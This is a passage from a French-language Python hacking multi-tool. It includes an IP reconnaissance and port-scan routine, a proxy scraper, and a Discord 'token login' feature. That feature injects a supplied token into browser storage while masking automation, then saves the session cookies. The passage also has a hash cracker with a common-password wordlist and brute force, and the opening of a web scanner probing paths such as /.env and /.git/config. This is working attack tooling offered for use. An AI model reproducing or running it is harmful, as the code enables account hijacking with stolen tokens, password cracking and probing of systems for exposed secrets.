                return None
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for p in ex.map(try_port, COMMON_PORTS):
                if p:
                    open_ports.append(p)

        with rlock:
            results["open_ports"] = sorted(open_ports)

    print(f"{YELLOW}[*] Interrogation des sources OSINT...{RESET}\n")

    threads = [
        threading.Thread(target=q_ipapi, daemon=True),
        threading.Thread(target=q_ipinfo, daemon=True),
        threading.Thread(target=q_shodan, daemon=True),
        threading.Thread(target=q_rdap, daemon=True),
        threading.Thread(target=q_bgpview, daemon=True),
        threading.Thread(target=q_abuseipdb, daemon=True),
        threading.Thread(target=q_reverse_dns, daemon=True),
        threading.Thread(target=q_http_headers, daemon=True),
        threading.Thread(target=q_ports, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    geo = results.get("ipapi") or {}
    if not geo:
        ii = results.get("ipinfo", {})
        geo = {
            "country": ii.get("country"),
            "regionName": ii.get("region"),
            "city": ii.get("city"),
            "zip": ii.get("postal"),
            "lat": (ii.get("loc", "0,0").split(",") + ["0"])[0],
            "lon": (ii.get("loc", "0,0").split(",") + ["0", "0"])[1],
            "timezone": ii.get("timezone"),
            "isp": ii.get("org"),
            "org": ii.get("org"),
        }

    print(f"\n{RED}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{RED}{BOLD}  IP : {target_ip}{RESET}")
    if resolved != target_ip:
        print(f"{RED}{BOLD}  Host : {target}{RESET}")
    print(f"{RED}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}{BOLD}── GEOLOCALISATION ──{RESET}")
    if geo:
        for k, label in [
            ("country", "Pays"), ("countryCode", "Code pays"),
            ("regionName", "Region"), ("city", "Ville"),
            ("zip", "ZIP"), ("lat", "Latitude"), ("lon", "Longitude"),
            ("timezone", "Timezone"),
        ]:
            v = geo.get(k)
            if v:
                print(f"{GREEN}[+] {label:<14}{RED} {v}{RESET}")
    else:
        print(f"{GRAY}[-] Aucune donnee geo{RESET}")

    print(f"\n{CYAN}{BOLD}── RESEAU / OPERATEUR ──{RESET}")
    for k, label in [
        ("isp", "ISP"), ("org", "Organization"), ("as", "AS"),
        ("asname", "AS Name"), ("reverse", "Reverse DNS"),
    ]:
        v = geo.get(k)
        if v:
            print(f"{GREEN}[+] {label:<14}{RED} {v}{RESET}")

    types = []
    if geo.get("proxy"):
        types.append("Proxy")
    if geo.get("hosting"):
        types.append("Hosting/VPN/Datacenter")
    if geo.get("mobile"):
        types.append("Mobile")
    if not types:
        types.append("Residential")
    print(f"{GREEN}[+] Type          {RED} {', '.join(types)}{RESET}")

    if "reverse_dns" in results:
        rv = results["reverse_dns"]
        print(f"\n{CYAN}{BOLD}── REVERSE DNS ──{RESET}")
        print(f"{GREEN}[+] Hostname      {RED} {rv['hostname']}{RESET}")
        if rv.get("aliases"):
            print(f"{GREEN}[+] Aliases       {RED} {', '.join(rv['aliases'])}{RESET}")

    if "http_headers" in results:
        print(f"\n{CYAN}{BOLD}── HTTP HEADERS ──{RESET}")
        print(f"{GREEN}[+] Status        {RED} {results.get('http_status')}{RESET}")
        for k in ("Server", "X-Powered-By", "X-AspNet-Version", "Via", "CF-Ray", "X-Cache"):
            if k in results["http_headers"]:
                print(f"{GREEN}[+] {k:<14}{RED} {results['http_headers'][k]}{RESET}")

    if "open_ports" in results:
        ports = results["open_ports"]
        print(f"\n{CYAN}{BOLD}── PORTS OUVERTS ──{RESET}")
        if ports:
            PORT_NAMES = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
                445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
                5900: "VNC", 6379: "Redis", 8080: "HTTP-alt",
                8443: "HTTPS-alt", 27017: "MongoDB",
            }
            for p in ports:
                label = PORT_NAMES.get(p, "unknown")
                color = RED if p in (22, 23, 445, 3389, 5900, 3306, 6379, 27017) else GREEN
                print(f"{color}[+] {p:<6} {label}{RESET}")
        else:
            print(f"{GRAY}[-] Aucun port commun ouvert{RESET}")

    if "shodan" in results:
        sd = results["shodan"]
        print(f"\n{CYAN}{BOLD}── SHODAN INTERNETDB ──{RESET}")
        if sd.get("hostnames"):
            print(f"{GREEN}[+] Hostnames   {RED} {', '.join(sd['hostnames'][:5])}{RESET}")
        if sd.get("ports"):
            print(f"{GREEN}[+] Ports        {RED} {sd['ports']}{RESET}")
        if sd.get("cpes"):
            for cpe in sd["cpes"][:10]:
                print(f"{GREEN}[+] CPE          {RED} {cpe}{RESET}")
        if sd.get("vulns"):
            print(f"{RED}[!] VULNERABILITES DETECTEES :{RESET}")
            for v in sd["vulns"]:
                print(f"{RED}    - {v}  → https://nvd.nist.gov/vuln/detail/{v}{RESET}")

    if "rdap" in results:
        rd = results["rdap"]
        print(f"\n{CYAN}{BOLD}── RDAP / WHOIS ──{RESET}")
        for e in (rd.get("entities") or [])[:3]:
            roles = ", ".join(e.get("roles", []))
            if roles:
                vcard = e.get("vcardArray", [None, []])[1]
                name = ""
                for item in vcard:
                    if item[0] == "fn":
                        name = item[3]
                        break
                if name:
                    print(f"{GREEN}[+] {roles:<20}{RED} {name}{RESET}")
        if rd.get("name"):
            print(f"{GREEN}[+] Network name  {RED} {rd['name']}{RESET}")
        if rd.get("handle"):
            print(f"{GREEN}[+] Handle        {RED} {rd['handle']}{RESET}")
        if rd.get("startAddress"):
            print(f"{GREEN}[+] Range         {RED} {rd.get('startAddress')} - {rd.get('endAddress', '?')}{RESET}")
        if rd.get("country"):
            print(f"{GREEN}[+] Country (reg) {RED} {rd['country']}{RESET}")

    if "bgpview" in results:
        bg = results["bgpview"]
        prefix = (bg.get("prefixes") or [{}])[0]
        if prefix:
            print(f"\n{CYAN}{BOLD}── BGP / ROUTAGE ──{RESET}")
            print(f"{GREEN}[+] Prefix      {RED} {prefix.get('prefix')}{RESET}")
            print(f"{GREEN}[+] Description {RED} {prefix.get('description')}{RESET}")
            asn = prefix.get("asn", {})
            if asn:
                print(f"{GREEN}[+] ASN         {RED} AS{asn.get('asn')} — {asn.get('name', '')}{RESET}")

    if "abuseipdb_page" in results:
        ab = results["abuseipdb_page"]
        if ab.get("reported"):
            print(f"\n{RED}{BOLD}── ABUSE REPORTS ──{RESET}")
            print(f"{RED}[!] Cette IP est signalee dans des rapports d'abus{RESET}")
            print(f"{GRAY}    https://www.abuseipdb.com/check/{target_ip}{RESET}")

    print(f"\n{CYAN}{BOLD}── RECHERCHES COMPLEMENTAIRES ──{RESET}")
    dorks = [
        f'"{target_ip}"',
        f'site:shodan.io {target_ip}',
        f'site:censys.io {target_ip}',
        f'"{target_ip}" abuse',
    ]
    for d in dorks:
        print(f"{GRAY}  {d}{RESET}")
        print(f"{GRAY}  https://www.google.com/search?q={urllib.parse.quote(d)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "IPLookup"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_ip = target_ip.replace(".", "_")
        out_file = out_dir / f"IP_{safe_ip}.json"
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump({
                "target": target,
                "ip": target_ip,
                "results": results,
                "timestamp": datetime.now().isoformat(),
            }, f, indent=2, ensure_ascii=False)
        print(f"\n{GREEN}[+] Rapport JSON : {out_file}{RESET}")
    except Exception:
        pass

    pause()


# ============================================================
#                     OPTION 17 — PROXY SCRAPER
# ============================================================

def option_17():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ PROXY SCRAPER ]{RESET}\n")
    print(f"{BLUE}01{RESET} Http")
    print(f"{BLUE}02{RESET} Https")
    print(f"{BLUE}03{RESET} Socks4")
    print(f"{BLUE}04{RESET} Socks5")
    print(f"{BLUE}05{RESET} All\n")

    choice = input(f"{YELLOW}[?]{RESET} Choice -> ").strip().lstrip("0")
    if choice not in ["1", "2", "3", "4", "5"]:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    check = input(f"{YELLOW}[?]{RESET} Check proxies? (y/n) -> ").strip().lower()
    do_check = check in ["y", "yes"]

    max_latency = 5000
    check_limit = None
    test_target = "https://api.ipify.org?format=json"

    if do_check:
        try:
            lat = input(f"{YELLOW}[?]{RESET} Max latency ms (def 5000) -> ").strip()
            if lat:
                max_latency = int(lat)
        except ValueError:
            max_latency = 5000
        try:
            lim = input(f"{YELLOW}[?]{RESET} Nombre a checker (all = tous) -> ").strip().lower()
            if lim and lim != "all":
                check_limit = int(lim)
        except ValueError:
            check_limit = None

    sources = {
        "http": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        ],
        "https": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
        ],
        "socks4": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        ],
        "socks5": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
        ],
    }

    protocol_map = {
        "1": ["http"], "2": ["https"], "3": ["socks4"], "4": ["socks5"],
        "5": ["http", "https", "socks4", "socks5"],
    }
    selected = protocol_map[choice]

    total_sources = sum(len(sources[p]) for p in selected)
    print(f"\n{CYAN}[*] Scraping {total_sources} sources...{RESET}")

    proxies = set()
    seen_hosts = set()
    lock = threading.Lock()
    sem = threading.Semaphore(50)
    scraped_count = [0]

    def scrape(url, proto):
        with sem:
            try:
                r = requests.get(url, timeout=12)
                if r.status_code != 200:
                    return
                for line in r.text.splitlines():
                    line = line.strip()
                    if "://" in line:
                        line = line.split("://")[-1]
                    parts = line.split(":")
                    if len(parts) < 2:
                        continue
                    host_part = parts[0].strip()
                    port_part = parts[1].strip()
                    if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", host_part):
                        continue
                    try:
                        port = int(port_part)
                        if not (1 <= port <= 65535):
                            continue
                    except ValueError:
                        continue
                    host = f"{host_part}:{port}"
                    with lock:
                        if host not in seen_hosts:
                            seen_hosts.add(host)
                            proxies.add(f"{proto}://{host}")
                with lock:
                    scraped_count[0] += 1
                    sys.stdout.write(
                        f"\r{CYAN}[*] {scraped_count[0]}/{total_sources} sources  |  "
                        f"{GREEN}{len(proxies)} proxies{RESET}    "
                    )
                    sys.stdout.flush()
            except Exception:
                pass

    threads = []
    for proto in selected:
        for url in sources[proto]:
            t = threading.Thread(target=scrape, args=(url, proto), daemon=True)
            threads.append(t)
            t.start()
    for t in threads:
        t.join()

    print()

    if not proxies:
        print(f"{RED}[!] Aucun proxy trouve.{RESET}")
        pause()
        return

    proxies = list(proxies)
    print(f"{GREEN}[+] {len(proxies)} proxies uniques recuperes{RESET}")

    valid = []
    if do_check:
        to_check = proxies[:check_limit] if check_limit else proxies
        print(f"{CYAN}[*] Check de {len(to_check)} proxies (max {max_latency}ms)...{RESET}\n")

        lock_v = threading.Lock()
        sem_v = threading.Semaphore(100)
        checked = [0]

        def check_proxy(proxy):
            with sem_v:
                try:
                    proto = proxy.split("://")[0]
                    start = time.time()
                    r = requests.get(
                        test_target,
                        proxies={proto: proxy},
                        timeout=max_latency / 1000,
                        headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                    )
                    lat = round((time.time() - start) * 1000)
                    if r.status_code != 200:
                        return

                    out_ip = "?"
                    try:
                        if "ipify" in test_target:
                            out_ip = r.json().get("ip", "?")
                        else:
                            out_ip = "ok"
                    except Exception:
                        pass

                    with lock_v:
                        valid.append({
                            "proxy": proxy,
                            "proto": proto,
                            "latency": lat,
                            "out_ip": out_ip,
                        })
                        checked[0] += 1
                        if checked[0] % 5 == 0:
                            sys.stdout.write(
                                f"\r{GREEN}[+] {checked[0]}/{len(to_check)} testes  |  "
                                f"{len(valid)} valides{RESET}    "
                            )
                            sys.stdout.flush()
                except Exception:
                    pass

        ts = [threading.Thread(target=check_proxy, args=(p,), daemon=True) for p in to_check]
        for t in ts:
            t.start()
        for t in ts:
            t.join()

        print(f"\n\n{GREEN}[+] {len(valid)} proxies valides sur {len(to_check)}{RESET}\n")

        valid.sort(key=lambda x: x["latency"])

        print(f"{CYAN}   TOP 20 PROXIES{RESET}")
        for i, v in enumerate(valid[:20], 1):
            print(
                f"{GREEN}[{i:>2}]{RESET} {v['proxy']:<45} | "
                f"{CYAN}{v['latency']:>5}ms{RESET} | "
                f"{GRAY}{v['out_ip']}{RESET}"
            )

        to_save = [v["proxy"] for v in valid]
    else:
        to_save = proxies

    out_dir = Path(_safe_workdir()) / "Output" / "ProxyScraper"
    out_dir.mkdir(parents=True, exist_ok=True)

    out_txt = out_dir / "proxies.txt"
    with open(out_txt, "w", encoding="utf-8") as f:
        f.write("\n".join(to_save))

    if do_check:
        out_json = out_dir / "proxies.json"
        with open(out_json, "w", encoding="utf-8") as f:
            json.dump(valid, f, indent=2, ensure_ascii=False)

    print(f"\n{GREEN}[+] Export :{RESET}")
    print(f"{GRAY}    {out_txt}{RESET}")

    if do_check and valid:
        print(f"\n{CYAN}   STATS{RESET}")
        print(f"{GREEN}[+] Total valides : {len(valid)}{RESET}")
        print(f"{GREEN}[+] Latence moyenne : {sum(v['latency'] for v in valid) // len(valid)}ms{RESET}")
        print(f"{GREEN}[+] Latence min : {valid[0]['latency']}ms{RESET}")

    try:
        if platform.system() == "Windows":
            os.startfile(str(out_dir))
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", str(out_dir)])
        else:
            subprocess.Popen(["xdg-open", str(out_dir)])
    except Exception:
        pass
    pause()


# ============================================================
#         OPTION 18 — DISCORD TOKEN LOGIN
# ============================================================

def option_18():
    clear()
    banner()

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.edge.options import Options as EdgeOptions
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        from selenium.webdriver.support.ui import WebDriverWait
    except ImportError:
        print(f"{RED}[!] Selenium manquant. pip install selenium{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ DISCORD TOKEN LOGIN ]{RESET}\n")
    token = input(f"{YELLOW}[?]{RESET} Colle ton token Discord -> ").strip()
    if not token:
        print(f"{RED}[!] Token vide.{RESET}")
        pause()
        return

    print(f"\n{YELLOW}[*] Verification du token via API Discord...{RESET}")
    try:
        r = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
            timeout=8,
        )
        if r.status_code == 200:
            info = r.json()
            print(f"{GREEN}[+] Token valide — @{info.get('username', '?')} ({info.get('id', '?')}){RESET}")
            print(f"{GRAY}    Email : {info.get('email', 'N/A')}{RESET}")
            print(f"{GRAY}    Nitro : {info.get('premium_type', 0)}{RESET}")
        elif r.status_code == 401:
            print(f"{RED}[!] Token invalide (401).{RESET}")
            pause()
            return
        else:
            print(f"{YELLOW}[!] HTTP {r.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Erreur : {e}{RESET}")

    print(f"\n{GRAY}Browser :{RESET}")
    print(f"{GRAY}  1. Chrome{RESET}")
    print(f"{GRAY}  2. Edge{RESET}")
    print(f"{GRAY}  3. Firefox{RESET}")

    bc = input(f"{YELLOW}[?]{RESET} Browser -> ").strip().lstrip("0") or "1"
    if bc not in ["1", "2", "3"]:
        bc = "1"

    print(f"\n{GRAY}Mode :{RESET}")
    print(f"{GRAY}  1. Fenetre visible{RESET}")
    print(f"{GRAY}  2. Headless{RESET}")
    print(f"{GRAY}  3. Profil persistant{RESET}")

    mode = input(f"{YELLOW}[?]{RESET} Mode (def 1) -> ").strip() or "1"
    if mode not in ["1", "2", "3"]:
        mode = "1"

    names = {"1": "Google Chrome", "2": "Microsoft Edge", "3": "Mozilla Firefox"}

    out_dir = Path(_safe_workdir()) / "Output" / "TokenLogin"
    out_dir.mkdir(parents=True, exist_ok=True)

    profile_dir = None
    if mode == "3":
        profile_dir = str(out_dir / "profile")
        os.makedirs(profile_dir, exist_ok=True)

    driver = None
    try:
        if bc == "1":
            opts = ChromeOptions()
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_experimental_option("excludeSwitches", ["enable-automation"])
            if mode == "2":
                opts.add_argument("--headless=new")
            if mode == "3" and profile_dir:
                opts.add_argument(f"--user-data-dir={profile_dir}")
            driver = webdriver.Chrome(options=opts)
        elif bc == "2":
            opts = EdgeOptions()
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_experimental_option("excludeSwitches", ["enable-automation"])
            if mode == "2":
                opts.add_argument("--headless=new")
            if mode == "3" and profile_dir:
                opts.add_argument(f"--user-data-dir={profile_dir}")
            driver = webdriver.Edge(options=opts)
        else:
            opts = FirefoxOptions()
            if mode == "2":
                opts.add_argument("--headless")
            if mode == "3" and profile_dir:
                opts.add_argument("-profile")
                opts.add_argument(profile_dir)
            driver = webdriver.Firefox(options=opts)

        try:
            driver.execute_cdp_cmd(
                "Page.addScriptToEvaluateOnNewDocument",
                {"source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"}
            )
        except Exception:
            pass
    except Exception as e:
        print(f"{RED}[!] Impossible de lancer {names[bc]} : {e}{RESET}")
        pause()
        return

    js = f"""
    (function() {{
        const token = `{token}`;
        window.localStorage.setItem('token', JSON.stringify(token));
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        setTimeout(() => {{
            iframe.contentWindow.localStorage.setItem('token', JSON.stringify(token));
        }}, 100);
    }})();
    """

    try:
        driver.get("https://discord.com/login")
        time.sleep(2)
        print(f"{CYAN}[*] Injection du token...{RESET}")
        driver.execute_script(js)
        time.sleep(1.5)
        driver.get("https://discord.com/channels/@me")

        try:
            WebDriverWait(driver, 15).until(
                lambda d: "channels/@me" in d.current_url and
                          d.execute_script("return document.readyState") == "complete"
            )
            time.sleep(3)

            logged = driver.execute_script("""
                try {
                    return !!(window.localStorage.getItem('token')) &&
                           document.querySelector('[class*="guilds"]') !== null;
                } catch(e) { return false; }
            """)

            if logged:
                print(f"{GREEN}[+] Login OK{RESET}")

                shot_dir = out_dir / "screens"
                shot_dir.mkdir(parents=True, exist_ok=True)
                shot_path = shot_dir / f"login_{int(time.time())}.png"
                try:
                    driver.save_screenshot(str(shot_path))
                    print(f"{GREEN}[+] Screenshot : {shot_path}{RESET}")
                except Exception:
                    pass

                try:
                    cookies = driver.get_cookies()
                    ck_path = out_dir / f"cookies_{int(time.time())}.json"
                    with open(ck_path, "w", encoding="utf-8") as f:
                        json.dump(cookies, f, indent=2)
                    print(f"{GREEN}[+] Cookies : {ck_path}{RESET}")
                except Exception:
                    pass
            else:
                print(f"{RED}[!] Login : ECHEC{RESET}")

        except Exception as e:
            print(f"{YELLOW}[!] Timeout : {e}{RESET}")

    except Exception as e:
        print(f"{RED}[!] Erreur : {e}{RESET}")

    if mode != "3":
        try:
            driver.quit()
        except Exception:
            pass

    print(f"{GRAY}[i] Si tu as utilise le mode 3, le browser reste ouvert.{RESET}")
    pause()


# ============================================================
#         OPTION 19 — HASH PASSWORD CRACKER
# ============================================================

def option_19():
    clear()
    banner()

    def _h(name):
        def f(s):
            if isinstance(s, str):
                s = s.encode()
            return hashlib.new(name, s).hexdigest()
        return f

    SIGS = [
        (r"^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$", "bcrypt", None),
        (r"^\$6\$", "sha512crypt", None),
        (r"^\$5\$", "sha256crypt", None),
        (r"^\$1\$", "md5crypt", None),
        (r"^[a-f0-9]{32}$", "md5", _h("md5")),
        (r"^[a-f0-9]{40}$", "sha1", _h("sha1")),
        (r"^[a-f0-9]{56}$", "sha224", _h("sha224")),
        (r"^[a-f0-9]{64}$", "sha256", _h("sha256")),
        (r"^[a-f0-9]{96}$", "sha384", _h("sha384")),
        (r"^[a-f0-9]{128}$", "sha512", _h("sha512")),
    ]

    ALGO_MAP = {
        "md5": "md5", "sha1": "sha1", "sha224": "sha224",
        "sha256": "sha256", "sha384": "sha384", "sha512": "sha512",
    }

    def identifier(h):
        h = h.strip()
        return [name for regex, name, _ in SIGS if re.match(regex, h, re.IGNORECASE)]

    def algo_fn(name):
        n = ALGO_MAP.get(name)
        return _h(n) if n else None

    def ntlm_hash(s):
        try:
            return hashlib.new("md4", s.encode("utf-16-le")).hexdigest()
        except Exception:
            return None

    wordlist = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey",
        "letmein", "dragon", "111111", "baseball", "iloveyou", "trustno1",
        "1234567", "sunshine", "master", "123123", "welcome", "shadow",
        "ashley", "football", "jesus", "michael", "ninja", "mustang",
        "password1", "password123", "admin", "root", "toor", "test",
        "guest", "user", "changeme", "secret", "azerty", "loulou",
        "soleil", "bonjour", "france", "paris", "marseille",
        "Password1!", "P@ssw0rd", "P@ssword123", "Summer2024!",
        "Winter2024!", "Admin123!", "Welcome1!", "Qwerty123!",
    ]

    try:
        import bcrypt as _bcrypt
    except ImportError:
        _bcrypt = None

    try:
        import crypt as _crypt
    except ImportError:
        _crypt = None

    try:
        from Crypto.Cipher import DES as _DES_MOD
    except ImportError:
        _DES_MOD = None

    def lm_hash(s):
        try:
            if _DES_MOD is None:
                return None
            password = s.upper()[:14]
            if len(password) < 14:
                password += "\0" * (14 - len(password))

            def _hash_part(part):
                return _DES_MOD.new(part.encode(), _DES_MOD.MODE_ECB).encrypt(b"KGS!@#$%").hex()
            return _hash_part(password[:7]) + _hash_part(password[7:])
        except Exception:
            return None

    while True:
        clear()
        banner()
        print(f"\n{CYAN}   [ HASH CRACKER ]{RESET}\n")
        print("  1. Identifier un hash")
        print("  2. Casser un hash (wordlist)")
        print("  3. Casser un hash (bruteforce)")
        print("  4. Generer un hash")
        print("  5. Tester un mot de passe contre un hash")
        print("  0. Quitter\n")
        c = input(f"{YELLOW}choix > {RESET}").strip()

        if c == "0":
            return
        elif c == "1":
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            if h:
                matches = identifier(h)
                print(f"\n{GRAY}Longueur : {len(h)}{RESET}")
                if matches:
                    print(f"{GREEN}Signatures :{RESET}")
                    for m in matches:
                        print(f"  - {m}")
                else:
                    print(f"{YELLOW}(aucune signature reconnue){RESET}")
                pause()
        elif c in ("2", "3"):
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            if not h:
                continue
            matches = identifier(h)
            algos = [m for m in matches if m in ALGO_MAP or m in ("bcrypt", "sha512crypt", "sha256crypt", "md5crypt")]
            if not algos:
                force = input(f"{YELLOW}[?]{RESET} Forcer md5/sha1/sha256/sha512 -> ").strip().lower()
                if force in ALGO_MAP:
                    algos = [force]
                else:
                    print(f"{RED}[!] Algo non identifie.{RESET}")
                    pause()
                    continue

            if c == "2":
                wl_path = input(f"{YELLOW}[?]{RESET} Wordlist path (vide = interne) -> ").strip()
                words = wordlist
                if wl_path and os.path.isfile(wl_path):
                    try:
                        with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                            words = [ln.rstrip("\r\n") for ln in f]
                    except Exception:
                        pass

                found = None
                for name in algos:
                    if name == "bcrypt":
                        if not _bcrypt:
                            continue
                        for w in words:
                            try:
                                if _bcrypt.checkpw(w.encode(), h.encode()):
                                    found = (w, name)
                                    break
                            except Exception:
                                continue
                    elif name in ("sha512crypt", "sha256crypt", "md5crypt"):
                        if not _crypt:
                            continue
                        for w in words:
                            try:
                                if _crypt.crypt(w, h) == h:
                                    found = (w, name)
                                    break
                            except Exception:
                                continue
                    else:
                        f = algo_fn(name)
                        if not f:
                            continue
                        for w in words:
                            if f(w) == h:
                                found = (w, name)
                                break
                    if found:
                        break

                if found:
                    print(f"\n{GREEN}[+] TROUVE : {found[0]} (algo: {found[1]}){RESET}")
                else:
                    print(f"\n{RED}[-] Pas trouve.{RESET}")
                pause()
            else:
                try:
                    maxl = int(input(f"{YELLOW}[?]{RESET} Longueur max (2-6) -> ").strip() or "4")
                except ValueError:
                    maxl = 4
                cs = input(f"{YELLOW}[?]{RESET} Charset (defaut a-z0-9) -> ").strip() or string.ascii_lowercase + string.digits
                found = None
                for name in algos:
                    f = algo_fn(name)
                    if not f:
                        continue
                    for n in range(1, maxl + 1):
                        for combo in itertools.product(cs, repeat=n):
                            w = "".join(combo)
                            if f(w) == h:
                                found = (w, name)
                                break
                        if found:
                            break
                    if found:
                        break
                if found:
                    print(f"\n{GREEN}[+] TROUVE : {found[0]} (algo: {found[1]}){RESET}")
                else:
                    print(f"\n{RED}[-] Pas trouve.{RESET}")
                pause()
        elif c == "4":
            pw = input(f"{YELLOW}[?]{RESET} Mot de passe -> ")
            print()
            for a in ["md5", "sha1", "sha256", "sha512", "sha3_256"]:
                print(f"  {a:10} {hashlib.new(a, pw.encode()).hexdigest()}")
            ntl = ntlm_hash(pw)
            if ntl:
                print(f"  {'ntlm':10} {ntl}")
            lm = lm_hash(pw)
            if lm:
                print(f"  {'lm':10} {lm}")
            pause()
        elif c == "5":
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            pw = input(f"{YELLOW}[?]{RESET} mot de passe a tester -> ")
            matches = identifier(h)
            ok = False
            for name in matches:
                f = algo_fn(name)
                if f and f(pw) == h:
                    print(f"{GREEN}[+] MATCH — {name}{RESET}")
                    ok = True
            for a in ["md5", "sha1", "sha256", "sha512"]:
                if hashlib.new(a, pw.encode()).hexdigest() == h:
                    print(f"{GREEN}[+] MATCH — {a}{RESET}")
                    ok = True
            if not ok:
                print(f"{RED}[-] Aucun match.{RESET}")
            pause()


# ============================================================
#         OPTION 20 — WEB VULNERABILITY SCANNER
# ============================================================

def option_20():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    TIMEOUT = 8
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124"

    SENSITIVE_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/.git/HEAD", "/.git/config", "/.gitignore",
        "/.svn/entries", "/.hg/hgrc",
